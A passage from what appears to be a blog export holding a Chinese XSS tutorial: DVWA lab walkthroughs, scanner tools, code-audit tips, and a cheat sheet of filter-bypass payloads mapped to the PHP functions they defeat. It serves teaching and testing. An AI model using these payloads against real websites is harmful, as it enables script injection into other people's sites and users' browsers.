class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"># No protections, anything goes</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901142115894.png\" alt=\"image-20200901142115894\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;option value=&quot;%3Cscript%3Ealert(%27xss%27)%3C/script%3E&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class=\"line\">&lt;/option&gt;`</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> script标签及值放在option标签内&lt;dom树执行结果&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"DVWA-Medium-1\"><a href=\"#DVWA-Medium-1\" class=\"headerlink\" title=\"DVWA-Medium\"></a>DVWA-Medium</h5><p>中级出现了对值&lt;script进行判断</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Is there any input?</span><br><span class=\"line\">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;</span><br><span class=\"line\">\t$default &#x3D; $_GET[&#39;default&#39;];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t# Do not allow script tags</span><br><span class=\"line\">\tif (stripos ($default, &quot;&lt;script&quot;) !&#x3D;&#x3D; false) &#123;</span><br><span class=\"line\">\t\theader (&quot;location: ?default&#x3D;English&quot;);</span><br><span class=\"line\">\t\texit;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 此时使用`&lt;img src=1 onerror=alert(1)&gt;`</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145238002.png\" alt=\"image-20200901145238002\"></p>\n<p>构造语句闭合option标签：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(1)&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145626304.png\" alt=\"image-20200901145626304\"></p>\n<p>&gt; 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 完成标签闭合完成</span></span><br><span class=\"line\">`&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145826892.png\" alt=\"image-20200901145826892\"></p>\n<h5 id=\"DVWA-High\"><a href=\"#DVWA-High\" class=\"headerlink\" title=\"DVWA-High\"></a>DVWA-High</h5><p>先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。</p>\n<h3 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><h4 id=\"黑盒测试\"><a href=\"#黑盒测试\" class=\"headerlink\" title=\"黑盒测试\"></a>黑盒测试</h4><h5 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h5><p><img src=\"/images/XSS/image-20200831112823669.png\" alt=\"image-20200831112823669\"></p>\n<p>一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。</p>\n<p>目前最新版本已经AWVS 13支持Web端配置如上图所示</p>\n<h5 id=\"BruteXSS\"><a href=\"#BruteXSS\" class=\"headerlink\" title=\"BruteXSS\"></a>BruteXSS</h5><p><a href=\"https://github.com/rajeshmajumdar/BruteXSS.git\">项目地址</a></p>\n<p><img src=\"/images/XSS/image-20200831111313145.png\" alt=\"image-20200831111313145\"></p>\n<p>BruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。</p>\n<p><strong>特点</strong></p>\n<ol>\n<li>XSS 爆破</li>\n<li>XSS 扫描</li>\n<li>GET/POST 请求</li>\n<li>可包含自定义单词</li>\n<li>人性化的 UI</li>\n</ol>\n<p>其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。</p>\n<h5 id=\"BeEF\"><a href=\"#BeEF\" class=\"headerlink\" title=\"BeEF\"></a>BeEF</h5><p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。</p>\n<p><img src=\"/images/XSS/logo.png\" alt=\"logo\"></p>\n<p>参考另一篇BeEF使用。</p>\n<h4 id=\"白盒测试\"><a href=\"#白盒测试\" class=\"headerlink\" title=\"白盒测试\"></a>白盒测试</h4><p>关于XSS的代码审计主要就是从<code>接收参数</code>和<code>输出函数</code>及一些关键词入手。</p>\n<p>PHP中常见<code>接收参数</code>的方式有：<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，</p>\n<p>PHP中常见<code>输出函数</code>的方式有：<code>print</code>，<code>print_r</code>，<code>echo</code>，<code>printf</code>，<code>sprintf</code>，<code>die</code>，<code>var_dump</code>，<code>var_export</code></p>\n<p>可以搜索<code>接收参数</code>的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>\n<p>也可以搜索<code>输出函数</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>\n<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>\n<p>DOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。</p>\n<h3 id=\"Bypass\"><a href=\"#Bypass\" class=\"headerlink\" title=\"Bypass\"></a>Bypass</h3><p>汇总部分绕过xss过滤方式，更多可搜“<code>XSS Filter Evasion Cheat Sheet_SecPulse</code>”一份专门介绍XSS的绕过。</p>\n<h4 id=\"大小写\"><a href=\"#大小写\" class=\"headerlink\" title=\"大小写\"></a>大小写</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;ScRIpT&gt;alert(&#x27;XSS&#x27;)&lt;/sCRIpT&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、十六进制编码</span><br><span class=\"line\">2、jsfuck编码</span><br><span class=\"line\">3、url编码</span><br><span class=\"line\">4、unicode编码等</span><br><span class=\"line\">5、`&lt;0x736372697074&gt;alert(&#x27;123&#x27;)&lt;/0x736372697074&gt;`</span><br><span class=\"line\">6、`&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"magic-quotes-gpc\"><a href=\"#magic-quotes-gpc\" class=\"headerlink\" title=\"magic_quotes_gpc\"></a>magic_quotes_gpc</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绕过可参考以下</span><br><span class=\"line\">`&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"标签\"><a href=\"#标签\" class=\"headerlink\" title=\"标签\"></a>标签</h4><h5 id=\"闭合\"><a href=\"#闭合\" class=\"headerlink\" title=\"闭合\"></a>闭合</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//查看源码输出位置是否存在标签未闭合情况来进行绕过</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;`</span><br><span class=\"line\">`&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"其它标签\"><a href=\"#其它标签\" class=\"headerlink\" title=\"其它标签\"></a>其它标签</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用较多方式是通过报错形式来添加标签进行绕过</span><br><span class=\"line\">`&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;`</span><br><span class=\"line\">`&lt;button onclick=&quot;javascript:alert(&#x27;XSS&#x27;)&gt;XSS&lt;/button&quot;&gt;`</span><br><span class=\"line\">`&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;`</span><br><span class=\"line\">`&quot;onsubmit=javascript:alert(1)%20name=&quot;a`</span><br><span class=\"line\">`&lt;details open ontoggle=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&quot;&gt;`</span><br><span class=\"line\">`&lt;video src=&quot;http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot; onprogress=(&#x27;body&#x27;).perpend(123);(&#x27;body&#x27;)&gt;&lt;/video&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"替换\"><a href=\"#替换\" class=\"headerlink\" title=\"替换\"></a>替换</h4><table>\n<thead>\n<tr>\n<th>符号</th>\n<th>替换</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%0a</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>/**/</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>%00</td>\n<td>截断</td>\n</tr>\n<tr>\n<td>``</td>\n<td>替换括号</td>\n</tr>\n</tbody></table>\n<h4 id=\"重复绕过\"><a href=\"#重复绕过\" class=\"headerlink\" title=\"重复绕过\"></a>重复绕过</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对部分字符过滤及替换时，采用重复形式进行绕过</span><br><span class=\"line\">`&lt;img ononerrorerror=&quot;123&quot;&gt;`</span><br><span class=\"line\">`&lt;script&gt;alalertert(123)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"宽子节绕过\"><a href=\"#宽子节绕过\" class=\"headerlink\" title=\"宽子节绕过\"></a>宽子节绕过</h4><p><code>GB系列</code>编码，尝试宽字节字符：</p>\n<p> <code>%c0</code>、<code>%bf</code>、<code>%5c</code>、<code>%df</code></p>\n<h4 id=\"事件属性\"><a href=\"#事件属性\" class=\"headerlink\" title=\"事件属性\"></a>事件属性</h4><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>解析</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>onclick</td>\n<td>鼠标点击事件</td>\n</tr>\n<tr>\n<td>onerror</td>\n<td>当加载文档或图像时发生某个错误</td>\n</tr>\n<tr>\n<td>onload</td>\n<td>某个页面或图像被完成加载</td>\n</tr>\n<tr>\n<td>onmousemove</td>\n<td>鼠标被移动</td>\n</tr>\n<tr>\n<td>等其它事件</td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"长度限制\"><a href=\"#长度限制\" class=\"headerlink\" title=\"长度限制\"></a>长度限制</h4><p>input标签中有maxlength限制传参长度，抓包修改发送数据。</p>\n<h4 id=\"PHP部分函数\"><a href=\"#PHP部分函数\" class=\"headerlink\" title=\"PHP部分函数\"></a>PHP部分函数</h4><p>php内包含部分过滤及转义函数及绕过方式统计</p>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>PHP函数</th>\n<th>函数解析</th>\n<th>绕过</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>str_replace()</td>\n<td>该函数区分大小写</td>\n<td>使用大小写进行绕过</td>\n</tr>\n<tr>\n<td>2</td>\n<td>str_ireplace()</td>\n<td>该函数不区分大小写</td>\n<td>双写绕过，如：<scscriptirpt></td>\n</tr>\n<tr>\n<td>3</td>\n<td>preg_replace()</td>\n<td>正则表达式的搜索和替换</td>\n<td>使用html标签事件绕过，如：<code>&lt;img src=xx onerror=alert(1)&gt;</code></td>\n</tr>\n<tr>\n<td>4</td>\n<td>htmlentities()</td>\n<td>将字符转换为 HTML 转义字符</td>\n<td>htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS</td>\n</tr>\n</tbody></table>\n<h3 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h3><p>不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；</p>\n<center>学习～</center>\n### 参考\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//反射型挑战解析</span><br><span class=\"line\">https://my.oschina.net/u/4332632/blog/3374751</span><br><span class=\"line\">https://www.cnblogs.com/bmjoker/p/9446472.html</span><br><span class=\"line\">bypass姿势</span><br><span class=\"line\">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</span><br><span class=\"line\">https://xz.aliyun.com/t/1678/</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckglobhdj0009b1hq1mkz2l84","tag_id":"ckglohsik0000ckhqfal88epl","_id":"ckglohsj00002ckhqgg3r1jx0"},{"post_id":"ckglobhdl000cb1hq6m9catc7","tag_id":"ckglohsiz0001ckhqc7fv3m13","_id":"ckglohsj10003ckhq02h94jo0"},{"post_id":"ckglobhdw000nb1hqg0xl2l01","tag_id":"ckglojua80000cwhqdr32e72x","_id":"ckglojuaq0001cwhqd8rvb6b8"},{"post_id":"ckglobhdi0008b1hq1lle73og","tag_id":"ckglongh00000dmhqd28za0yi","_id":"ckglonghd0001dmhqc5vihy3n"},{"post_id":"ckglobhe90010b1hq8nll0c6u","tag_id":"ckglopaga0000dyhq7rpn7a7b","_id":"ckglopagn0001dyhqahss15ze"},{"post_id":"ckglobhdl000bb1hq9pn7bwor","tag_id":"ckglornjs0000ebhqfux4dqo5","_id":"ckglornk40001ebhq592wcqx0"},{"post_id":"ckglobhe7000yb1hqd4yhf0av","tag_id":"ckglp2u0r0000gshq5dv5foi3","_id":"ckglp2u140001gshq8i0u7igk"},{"post_id":"ckglobhe1000tb1hqfby9b5b4","tag_id":"ckglp3hzx0000h3hq1uz10e2b","_id":"ckglp3i0a0001h3hqbyjg2ghy"},{"post_id":"ckglobhe0000sb1hq478s3c6n","tag_id":"ckglp44rv0000hfhqfdvt3df6","_id":"ckglp44sk0001hfhq8v1s5zt3"},{"post_id":"ckglobhe4000xb1hq96n3ebv1","tag_id":"ckglp4h320000hqhq347td29d","_id":"ckglp4h3o0001hqhq5jdrb7dm"},{"post_id":"ckglobhd60001b1hqao6f43mp","tag_id":"ckglpjyj90000ighqg5ltgq5e","_id":"ckglpjyjs0002ighq4oxvfhx9"},{"post_id":"ckglobhdf0004b1hqhxahdeve","tag_id":"ckglpjyjw0005ighq8bv144t2","_id":"ckglpjyjz0008ighq5nv6bkia"},{"post_id":"ckglobhdf0005b1hq5jo5devl","tag_id":"ckglpjyjy0007ighqcbfo445g","_id":"ckglpjyk2000aighqb6hp2lx4"},{"post_id":"ckglobhdg0006b1hq12rs6k78","tag_id":"ckglpjyk20009ighqenxs4ynk","_id":"ckglpjyk6000cighqdrxecus8"},{"post_id":"ckglobhdh0007b1hq690q0gid","tag_id":"ckglpjyk5000bighq0p9j5cey","_id":"ckglpjyk9000eighqgp2u5gcg"},{"post_id":"ckglobhdk000ab1hq1wna2n3d","tag_id":"ckglpjyk7000dighq6wyu8lvr","_id":"ckglpjykb000gighq2ybwbcv9"},{"post_id":"ckglobhdm000db1hq7yo91abe","tag_id":"ckglpjyka000fighqgrvn4x3y","_id":"ckglpjykd000iighqawm3am4l"},{"post_id":"ckglobhdq000eb1hq8vm868em","tag_id":"ckglpjykc000highqazhgbdq3","_id":"ckglpjykd000kighqh0q0ecz5"},{"post_id":"ckglobhdr000fb1hq3xsmdv86","tag_id":"ckglpjykd000jighq15e4e07u","_id":"ckglpjyke000mighqc09ab8n9"},{"post_id":"ckglobhds000gb1hq56i4dazt","tag_id":"ckglpjykd000lighqemceh20p","_id":"ckglpjyke000oighq3nuzeiej"},{"post_id":"ckglobhdt000ib1hq2vqgem3l","tag_id":"ckglpjyke000nighqfqmzcdvn","_id":"ckglpjykf000qighqhwnwdwt9"},{"post_id":"ckglobhdu000jb1hq5kl27se6","tag_id":"ckglpjyke000pighq8b0r42fk","_id":"ckglpjykj000sighq1p376xbr"},{"post_id":"ckglobhdu000kb1hq8gebe946","tag_id":"ckglpjykf000righqhi9u2cwv","_id":"ckglpjykk000uighqfpye5186"},{"post_id":"ckglobhdv000lb1hq8ti2hanx","tag_id":"ckglpjykj000tighq8qsoavst","_id":"ckglpjykk000wighq96hl7btv"},{"post_id":"ckglobhdy000pb1hq1vheaxmd","tag_id":"ckglpjykl000zighq5p5pe586","_id":"ckglpjykz0012ighq0nva4evs"},{"post_id":"ckglobhe2000vb1hq43uj3803","tag_id":"ckglpjykl0011ighq2e6m5pm3","_id":"ckglpjyl00014ighq7ftk1eu0"},{"post_id":"ckglobhe3000wb1hq315g1lnh","tag_id":"ckglpjykz0013ighqa82n1es9","_id":"ckglpjyl10016ighq03kx8b7u"},{"post_id":"ckglobhe8000zb1hqf8nkfzhc","tag_id":"ckglpjyl00015ighqe5u81a2e","_id":"ckglpjyl10017ighq3jl0b1dm"},{"post_id":"ckglobheb0012b1hq9gcy2pdl","tag_id":"ckglpjyka000fighqgrvn4x3y","_id":"ckglpjyl40019ighqgmfp63j4"},{"post_id":"ckglobhea0011b1hqazybbu5n","tag_id":"ckglpjyl40018ighqebbd9aqy","_id":"ckglpjyl4001aighqe1v74iqx"},{"post_id":"ckglobheq0014b1hqh5du2pvr","tag_id":"ckglpjyl7001bighqgf122ua1","_id":"ckglpjyl8001cighqdp074jfi"},{"post_id":"ckglobhdb0002b1hq8cp5cv2w","tag_id":"ckglr5nwp0000lshqev8b96j5","_id":"ckglr5nx20002lshqbl418qla"},{"post_id":"ckglobhdd0003b1hqbxg66l2x","tag_id":"ckglr5nx20001lshqeb2l1apl","_id":"ckglr5nx30003lshqfu8d456u"},{"post_id":"ckglobhdx000ob1hq8jpba0dz","tag_id":"ckglpjykd000jighq15e4e07u","_id":"ckglr6q520000m3hq8btf0s29"}],"Tag":[{"name":"JWT","_id":"ckglohsik0000ckhqfal88epl"},{"name":"MongoDB","_id":"ckglohsiz0001ckhqc7fv3m13"},{"name":"Webshell","_id":"ckglojua80000cwhqdr32e72x"},{"name":"JSONP","_id":"ckglongh00000dmhqd28za0yi"},{"name":"Web","_id":"ckglopaga0000dyhq7rpn7a7b"},{"name":"Mac","_id":"ckglornjs0000ebhqfux4dqo5"},{"name":"YOURLS","_id":"ckglp2u0r0000gshq5dv5foi3"},{"name":"智能卡","_id":"ckglp3hzx0000h3hq1uz10e2b"},{"name":"前端安全","_id":"ckglp44rv0000hfhqfdvt3df6"},{"name":"树莓派","_id":"ckglp4h320000hqhq347td29d"},{"name":"API渗透","_id":"ckglpjyj90000ighqg5ltgq5e"},{"name":"-Burpsuite","_id":"ckglpjyjr0001ighq3ovq9yxd"},{"name":"-CDN","_id":"ckglpjyjt0003ighq5lea62zd"},{"name":"CVE-2019-0708","_id":"ckglpjyjw0005ighq8bv144t2"},{"name":"DNS-Injection","_id":"ckglpjyjy0007ighqcbfo445g"},{"name":"移动应用安全","_id":"ckglpjyk20009ighqenxs4ynk"},{"name":"JMeter","_id":"ckglpjyk5000bighq0p9j5cey"},{"name":"应急","_id":"ckglpjyk7000dighq6wyu8lvr"},{"name":"注入","_id":"ckglpjyka000fighqgrvn4x3y"},{"name":"Passionfruit","_id":"ckglpjykc000highqazhgbdq3"},{"name":"Books","_id":"ckglpjykd000jighq15e4e07u"},{"name":"Scout2","_id":"ckglpjykd000lighqemceh20p"},{"name":"Sysmon","_id":"ckglpjyke000nighqfqmzcdvn"},{"name":"Tcpdump","_id":"ckglpjyke000pighq8b0r42fk"},{"name":"Tomcat","_id":"ckglpjykf000righqhi9u2cwv"},{"name":"重定向","_id":"ckglpjykj000tighq8qsoavst"},{"name":"Weblogic","_id":"ckglpjykk000vighq7tbleg3f"},{"name":"-Books","_id":"ckglpjykk000xighq1f0s4cb4"},{"name":"iOS越狱","_id":"ckglpjykl000zighq5p5pe586"},{"name":"渗透思路","_id":"ckglpjykl0011ighq2e6m5pm3"},{"name":"文档","_id":"ckglpjykz0013ighqa82n1es9"},{"name":"越权访问","_id":"ckglpjyl00015ighqe5u81a2e"},{"name":"Jboss","_id":"ckglpjyl40018ighqebbd9aqy"},{"name":"XSS","_id":"ckglpjyl7001bighqgf122ua1"},{"name":"Burpsuite","_id":"ckglr5nwp0000lshqev8b96j5"},{"name":"CDN","_id":"ckglr5nx20001lshqeb2l1apl"}]}}